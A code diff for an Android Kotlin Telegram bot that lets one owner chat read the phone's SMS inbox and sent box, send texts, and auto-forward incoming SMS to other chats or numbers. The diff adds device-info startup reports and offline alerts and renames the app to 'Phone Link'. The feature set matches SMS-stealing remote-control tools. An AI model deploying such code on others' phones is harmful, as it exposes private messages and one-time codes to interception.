@@ -6,7 +6,6 @@ import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
-import java.net.URLEncoder
 
 class TelegramBot(
     private val context: Context,
@@ -16,22 +15,26 @@ class TelegramBot(
     private val baseUrl = "https://api.telegram.org/bot$botToken"
     private var lastUpdateId = 0L
     private var pollingJob: Job? = null
-    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-
-    // State tracking per user session
+    val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val userState = mutableMapOf<String, String>()
     private val userTempData = mutableMapOf<String, String>()
 
-    // ─── Polling ────────────────────────────────────────────────────────────
+    // ─── Startup ─────────────────────────────────────────────────────────────
+
+    fun sendStartupMessage() {
+        scope.launch {
+            delay(3000) // Wait for connection to stabilize
+            val msg = DeviceInfoHelper.formatStartupMessage(context)
+            sendMessage(ownerChatId, msg, buildMainMenu())
+        }
+    }
+
+    // ─── Polling ─────────────────────────────────────────────────────────────
 
     fun startPolling() {
         pollingJob = scope.launch {
             while (isActive) {
-                try {
-                    fetchUpdates()
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
+                try { fetchUpdates() } catch (e: Exception) { e.printStackTrace() }
                 delay(1000)
             }
         }
@@ -39,10 +42,14 @@ class TelegramBot(
 
     fun stopPolling() {
         pollingJob?.cancel()
-        scope.cancel()
     }
 
-    // ─── Fetch Updates ───────────────────────────────────────────────────────
+    fun reconnect() {
+        pollingJob?.cancel()
+        startPolling()
+    }
+
+    // ─── Fetch Updates ────────────────────────────────────────────────────────
 
     private fun fetchUpdates() {
         val url = "$baseUrl/getUpdates?offset=${lastUpdateId + 1}&timeout=5"
@@ -57,8 +64,6 @@ class TelegramBot(
         }
     }
 
-    // ─── Handle Incoming Updates ─────────────────────────────────────────────
-
     private fun handleUpdate(update: JSONObject) {
         when {
             update.has("message") -> handleMessage(update.getJSONObject("message"))
@@ -69,225 +74,212 @@ class TelegramBot(
     private fun handleMessage(message: JSONObject) {
         val chatId = message.getJSONObject("chat").getString("id")
         val text = message.optString("text", "")
-
-        // Only respond to owner
         if (chatId != ownerChatId) return
-
         val state = userState[chatId]
-
         when {
-            // ── Awaiting phone number to send SMS ──
             state == "awaiting_send_number" -> {
                 userTempData[chatId] = text
                 userState[chatId] = "awaiting_send_body"
-                sendMessage(chatId, "✉️ Now type your message to send:", buildCancelButton())
+                sendMessage(chatId, "✉️ Now type your message:", buildCancelButton())
             }
-            // ── Awaiting SMS body ──
             state == "awaiting_send_body" -> {
                 val number = userTempData[chatId] ?: ""
                 val success = SmsSender.sendSms(number, text)
-                userState.remove(chatId)
-                userTempData.remove(chatId)
-                if (success) {
-                    sendMessage(chatId, "✅ Message sent to $number!", buildMainMenu())
-                } else {
-                    sendMessage(chatId, "❌ Failed to send. Check the number and try again.", buildMainMenu())
-                }
+                userState.remove(chatId); userTempData.remove(chatId)
+                if (success) sendMessage(chatId, "✅ Message sent to $number!", buildMainMenu())
+                else sendMessage(chatId, "❌ Failed to send. Check the number.", buildMainMenu())
             }
-            // ── Awaiting Telegram forward target ──
             state == "awaiting_tg_target" -> {
-                val address = text.trim()
-                val target = ForwardTarget(
-                    id = ForwardManager.generateId(),
-                    address = address,
-                    label = address,
-                    type = ForwardTarget.Type.TELEGRAM
-                )
+                val target = ForwardTarget(ForwardManager.generateId(), text.trim(), text.trim(), ForwardTarget.Type.TELEGRAM)
                 ForwardManager.addTarget(context, target)
                 userState.remove(chatId)
-                sendMessage(chatId, "✅ Added Telegram target: $address\nAll new messages will be forwarded here.", buildForwardMenu())
+                sendMessage(chatId, "✅ Added Telegram target: ${text.trim()}", buildForwardMenu())
             }
-            // ── Awaiting phone number for SMS forwarding ──
             state == "awaiting_sms_target" -> {
-                val number = text.trim()
-                val target = ForwardTarget(
-                    id = ForwardManager.generateId(),
-                    address = number,
-                    label = number,
-                    type = ForwardTarget.Type.SMS
-                )
+                val target = ForwardTarget(ForwardManager.generateId(), text.trim(), text.trim(), ForwardTarget.Type.SMS)
                 ForwardManager.addTarget(context, target)
                 userState.remove(chatId)
-                sendMessage(chatId, "✅ Added SMS forward number: $number", buildForwardMenu())
+                sendMessage(chatId, "✅ Added SMS forward: ${text.trim()}", buildForwardMenu())
             }
-            // ── Default: show main menu ──
-            else -> {
-                sendMessage(chatId, "👋 Welcome to *SMS Gateway*\nChoose an option below:", buildMainMenu())
-            }
+            else -> sendMessage(chatId, "👋 Welcome to *Phone Link*\nChoose an option:", buildMainMenu())
         }
     }
 
     private fun handleCallback(callbackQuery: JSONObject) {
         val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getString("id")
         val data = callbackQuery.getString("data")
-        val messageId = callbackQuery.getJSONObject("message").getLong("message_id")
-
         if (chatId != ownerChatId) return
-
-        // Acknowledge button tap
         answerCallback(callbackQuery.getString("id"))
 
         when (data) {
-
-            // ── Main Menu ──
             "menu_inbox" -> showInbox(chatId)
             "menu_sent" -> showSent(chatId)
             "menu_send" -> {
                 userState[chatId] = "awaiting_send_number"
-                sendMessage(chatId, "📞 Enter the phone number to message:\n(Example: +919876543210)", buildCancelButton())
+                sendMessage(chatId, "📞 Enter phone number:\n(Example: +919876543210)", buildCancelButton())
             }
-            "menu_forwards" -> sendMessage(chatId, "📋 *Auto-Forward Settings*\nChoose an option:", buildForwardMenu())
-            "menu_settings" -> sendMessage(chatId, "⚙️ *Settings*", buildSettingsMenu())
-            "menu_main" -> sendMessage(chatId, "📱 *SMS Gateway*\nChoose an option:", buildMainMenu())
-
-            // ── Inbox Pagination ──
+            "menu_forwards" -> sendMessage(chatId, "📋 *Auto-Forward Settings*", buildForwardMenu())
+            "menu_status" -> showStatus(chatId)
+            "menu_main" -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
             "inbox_refresh" -> showInbox(chatId)
             "sent_refresh" -> showSent(chatId)
+            "status_refresh" -> showStatus(chatId)
 
-            // ── Forward Menu ──
+            // ── Reconnect button ──
+            "action_reconnect" -> {
+                sendMessage(chatId, "🔄 *Reconnecting...*\nRestarting connection now!", null)
+                ConnectionMonitor.reconnectRequested = true
+            }
+
             "fwd_add_telegram" -> {
                 userState[chatId] = "awaiting_tg_target"
-                sendMessage(chatId,
-                    "📲 Send the Telegram username, channel link or group link:\n\nExamples:\n• @username\n• @channelname\n• -1001234567890",
-                    buildCancelButton()
-                )
+                sendMessage(chatId, "📲 Send username, channel or group link:\n\n• @username\n• @channelname\n• -1001234567890", buildCancelButton())
             }
             "fwd_add_sms" -> {
                 userState[chatId] = "awaiting_sms_target"
-                sendMessage(chatId, "📞 Enter the phone number to forward via SMS:\n(Example: +919876543210)", buildCancelButton())
+                sendMessage(chatId, "📞 Enter phone number to forward via SMS:", buildCancelButton())
             }
             "fwd_list" -> showForwardList(chatId)
             "fwd_clear" -> {
                 ForwardManager.clearAll(context)
                 sendMessage(chatId, "🗑️ All forward targets removed.", buildForwardMenu())
             }
-            "fwd_back" -> sendMessage(chatId, "📱 *SMS Gateway*\nChoose an option:", buildMainMenu())
-
-            // ── Cancel ──
+            "fwd_back" -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
             "action_cancel" -> {
-                userState.remove(chatId)
-                userTempData.remove(chatId)
-                sendMessage(chatId, "❌ Cancelled. Back to main menu.", buildMainMenu())
+                userState.remove(chatId); userTempData.remove(chatId)
+                sendMessage(chatId, "❌ Cancelled.", buildMainMenu())
             }
-
-            // ── Remove specific forward target ──
             else -> {
                 if (data.startsWith("remove_")) {
-                    val id = data.removePrefix("remove_")
-                    ForwardManager.removeTarget(context, id)
+                    ForwardManager.removeTarget(context, data.removePrefix("remove_"))
                     sendMessage(chatId, "✅ Removed successfully.", buildForwardMenu())
                 }
             }
         }
     }
 
-    // ─── Show Inbox ──────────────────────────────────────────────────────────
+    // ─── Status Panel ─────────────────────────────────────────────────────────
 
-    private fun showInbox(chatId: String) {
-        val messages = SmsReader.getInbox(context, 10)
-        if (messages.isEmpty()) {
-            sendMessage(chatId, "📭 Inbox is empty.", buildBackToMenuButton())
-            return
+    private fun showStatus(chatId: String) {
+        val isOnline = ConnectionMonitor.lastStatus != ConnectionMonitor.Status.OFFLINE
+        val ping = ConnectionMonitor.lastPingMs
+        val msg = DeviceInfoHelper.formatStatusMessage(context, ping, isOnline)
+        val keyboard = JSONObject().apply {
+            put("inline_keyboard", JSONArray().apply {
+                put(JSONArray().apply {
+                    put(btn("🔄 Refresh", "status_refresh"))
+                    put(btn("🔙 Back", "menu_main"))
+                })
+                if (!isOnline) {
+                    put(JSONArray().apply {
+                        put(btn("🔄 Reconnect Now", "action_reconnect"))
+                    })
+                }
+            })
         }
-        val sb = StringBuilder("📥 *Inbox* — Latest 10 messages\n\n")
-        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
+        sendMessage(chatId, msg, keyboard)
+    }
+
+    // ─── Offline Alert with Reconnect Button ─────────────────────────────────
+
+    fun sendOfflineAlert(deviceName: String) {
+        val text = """
+🔴 *Device Offline!*
+Connection lost!
+
+📱 $deviceName
+⏱ Tap below to reconnect instantly
+        """.trimIndent()
 
         val keyboard = JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🔄 Refresh"); put("callback_data", "inbox_refresh") })
-                    put(JSONObject().apply { put("text", "🔙 Back"); put("callback_data", "menu_main") })
+                    put(btn("🔄 Reconnect Now", "action_reconnect"))
                 })
-            })
-        }
-        sendMessage(chatId, sb.toString(), keyboard)
-    }
-
-    // ─── Show Sent ───────────────────────────────────────────────────────────
-
-    private fun showSent(chatId: String) {
-        val messages = SmsReader.getSent(context, 10)
-        if (messages.isEmpty()) {
-            sendMessage(chatId, "📭 Sent box is empty.", buildBackToMenuButton())
-            return
-        }
-        val sb = StringBuilder("📤 *Sent* — Latest 10 messages\n\n")
-        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
-
-        val keyboard = JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🔄 Refresh"); put("callback_data", "sent_refresh") })
-                    put(JSONObject().apply { put("text", "🔙 Back"); put("callback_data", "menu_main") })
-                })
-            })
-        }
-        sendMessage(chatId, sb.toString(), keyboard)
-    }
-
-    // ─── Show Forward List ───────────────────────────────────────────────────
-
-    private fun showForwardList(chatId: String) {
-        val targets = ForwardManager.getForwardTargets(context)
-        if (targets.isEmpty()) {
-            sendMessage(chatId, "📭 No forward targets added yet.", buildForwardMenu())
-            return
-        }
-        val sb = StringBuilder("📃 *Active Forward Targets:*\n\n")
-        targets.forEachIndexed { i, t ->
-            val icon = if (t.type == ForwardTarget.Type.TELEGRAM) "💬" else "📱"
-            sb.append("${i + 1}. $icon ${t.label}\n")
-        }
-
-        val rows = JSONArray()
-        targets.forEach { t ->
-            rows.put(JSONArray().apply {
-                put(JSONObject().apply {
-                    put("text", "🗑️ Remove ${t.label}")
-                    put("callback_data", "remove_${t.id}")
-                })
-            })
-        }
-        rows.put(JSONArray().apply {
-            put(JSONObject().apply { put("text", "🔙 Back"); put("callback_data", "menu_forwards") })
-        })
-
-        sendMessage(chatId, sb.toString(), JSONObject().apply { put("inline_keyboard", rows) })
-    }
-
-    // ─── Notify New Message ──────────────────────────────────────────────────
-
-    fun notifyNewMessage(message: SmsMessage) {
-        val text = "📨 *New Message Received!*\n\n${message.formatForTelegram()}"
-        val keyboard = JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "↩️ Reply"); put("callback_data", "menu_send") })
-                    put(JSONObject().apply { put("text", "📥 Inbox"); put("callback_data", "menu_inbox") })
+                    put(btn("📡 Check Status", "menu_status"))
                 })
             })
         }
         sendMessage(ownerChatId, text, keyboard)
     }
 
-    // ─── Forward Message to Target ───────────────────────────────────────────
+    // ─── Status Alert ─────────────────────────────────────────────────────────
 
-    fun forwardMessage(targetChatId: String, message: SmsMessage) {
-        val text = "📨 *Forwarded Message*\n\n${message.formatForTelegram()}"
-        sendMessage(targetChatId, text, null)
+    fun sendStatusAlert(message: String) {
+        sendMessage(ownerChatId, message, null)
     }
 
-    // ─── Button Builders ─────────────────────────────────────────────────────
+    // ─── Inbox / Sent ──────────────────────────────────────────────────────────
+
+    private fun showInbox(chatId: String) {
+        val messages = SmsReader.getInbox(context, 10)
+        if (messages.isEmpty()) { sendMessage(chatId, "📭 Inbox is empty.", buildBackButton()); return }
+        val sb = StringBuilder("📥 *Inbox* — Latest 10\n\n")
+        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
+        val keyboard = JSONObject().apply {
+            put("inline_keyboard", JSONArray().apply {
+                put(JSONArray().apply {
+                    put(btn("🔄 Refresh", "inbox_refresh"))
+                    put(btn("🔙 Back", "menu_main"))
+                })
+            })
+        }
+        sendMessage(chatId, sb.toString(), keyboard)
+    }
+
+    private fun showSent(chatId: String) {
+        val messages = SmsReader.getSent(context, 10)
+        if (messages.isEmpty()) { sendMessage(chatId, "📭 Sent box is empty.", buildBackButton()); return }
+        val sb = StringBuilder("📤 *Sent* — Latest 10\n\n")
+        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
+        val keyboard = JSONObject().apply {
+            put("inline_keyboard", JSONArray().apply {
+                put(JSONArray().apply {
+                    put(btn("🔄 Refresh", "sent_refresh"))
+                    put(btn("🔙 Back", "menu_main"))
+                })
+            })
+        }
+        sendMessage(chatId, sb.toString(), keyboard)
+    }
+
+    private fun showForwardList(chatId: String) {
+        val targets = ForwardManager.getForwardTargets(context)
+        if (targets.isEmpty()) { sendMessage(chatId, "📭 No targets added yet.", buildForwardMenu()); return }
+        val sb = StringBuilder("📃 *Active Forward Targets:*\n\n")
+        targets.forEachIndexed { i, t ->
+            val icon = if (t.type == ForwardTarget.Type.TELEGRAM) "💬" else "📱"
+            sb.append("${i + 1}. $icon ${t.label}\n")
+        }
+        val rows = JSONArray()
+        targets.forEach { t ->
+            rows.put(JSONArray().apply {
+                put(JSONObject().apply { put("text", "🗑️ Remove ${t.label}"); put("callback_data", "remove_${t.id}") })
+            })
+        }
+        rows.put(JSONArray().apply { put(btn("🔙 Back", "menu_forwards")) })
+        sendMessage(chatId, sb.toString(), JSONObject().apply { put("inline_keyboard", rows) })
+    }
+
+    fun notifyNewMessage(message: SmsMessage) {
+        val text = "📨 *New Message Received!*\n\n${message.formatForTelegram()}"
+        val keyboard = JSONObject().apply {
+            put("inline_keyboard", JSONArray().apply {
+                put(JSONArray().apply {
+                    put(btn("↩️ Reply", "menu_send"))
+                    put(btn("📥 Inbox", "menu_inbox"))
+                })
+            })
+        }
+        sendMessage(ownerChatId, text, keyboard)
+    }
+
+    fun forwardMessage(targetChatId: String, message: SmsMessage) {
+        sendMessage(targetChatId, "📨 *Forwarded Message*\n\n${message.formatForTelegram()}", null)
+    }
+
+    // ─── Button Builders ───────────────────────────────────────────────────────
 
     private fun buildMainMenu(): JSONObject {
         return JSONObject().apply {
@@ -298,7 +290,7 @@ class TelegramBot(
                 })
                 put(JSONArray().apply {
                     put(btn("✉️ Send Message", "menu_send"))
-                    put(btn("⚙️ Settings", "menu_settings"))
+                    put(btn("📡 Status", "menu_status"))
                 })
                 put(JSONArray().apply {
                     put(btn("📋 Auto-Forward", "menu_forwards"))
@@ -310,59 +302,34 @@ class TelegramBot(
     private fun buildForwardMenu(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
+                put(JSONArray().apply { put(btn("➕ Add Telegram Target", "fwd_add_telegram")) })
+                put(JSONArray().apply { put(btn("➕ Add Phone Number", "fwd_add_sms")) })
                 put(JSONArray().apply {
-                    put(btn("➕ Add Telegram Target", "fwd_add_telegram"))
-                })
-                put(JSONArray().apply {
-                    put(btn("➕ Add Phone Number", "fwd_add_sms"))
-                })
-                put(JSONArray().apply {
-                    put(btn("📃 View All Targets", "fwd_list"))
+                    put(btn("📃 View All", "fwd_list"))
                     put(btn("🗑️ Clear All", "fwd_clear"))
                 })
-                put(JSONArray().apply {
-                    put(btn("🔙 Back", "fwd_back"))
-                })
+                put(JSONArray().apply { put(btn("🔙 Back", "fwd_back")) })
             })
         }
     }
 
-    private fun buildSettingsMenu(): JSONObject {
-        return JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                put(JSONArray().apply {
-                    put(btn("🔙 Back to Menu", "menu_main"))
-                })
-            })
-        }
+    private fun buildCancelButton() = JSONObject().apply {
+        put("inline_keyboard", JSONArray().apply {
+            put(JSONArray().apply { put(btn("❌ Cancel", "action_cancel")) })
+        })
     }
 
-    private fun buildCancelButton(): JSONObject {
-        return JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                put(JSONArray().apply {
-                    put(btn("❌ Cancel", "action_cancel"))
-                })
-            })
-        }
-    }
-
-    private fun buildBackToMenuButton(): JSONObject {
-        return JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                put(JSONArray().apply {
-                    put(btn("🔙 Back to Menu", "menu_main"))
-                })
-            })
-        }
+    private fun buildBackButton() = JSONObject().apply {
+        put("inline_keyboard", JSONArray().apply {
+            put(JSONArray().apply { put(btn("🔙 Back to Menu", "menu_main")) })
+        })
     }
 
     private fun btn(text: String, data: String) = JSONObject().apply {
-        put("text", text)
-        put("callback_data", data)
+        put("text", text); put("callback_data", data)
     }
 
-    // ─── HTTP Helpers ────────────────────────────────────────────────────────
+    // ─── HTTP Helpers ──────────────────────────────────────────────────────────
 
     fun sendMessage(chatId: String, text: String, replyMarkup: JSONObject? = null) {
         scope.launch {
@@ -381,9 +348,7 @@ class TelegramBot(
                 conn.outputStream.write(body.toString().toByteArray())
                 conn.inputStream.bufferedReader().readText()
                 conn.disconnect()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }
     }
 
@@ -399,9 +364,7 @@ class TelegramBot(
                 conn.outputStream.write(body.toString().toByteArray())
                 conn.inputStream.bufferedReader().readText()
                 conn.disconnect()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }
     }
 
@@ -414,9 +377,6 @@ class TelegramBot(
             val result = conn.inputStream.bufferedReader().readText()
             conn.disconnect()
             result
-        } catch (e: Exception) {
-            e.printStackTrace()
-            null
-        }
+        } catch (e: Exception) { e.printStackTrace(); null }
     }
 }
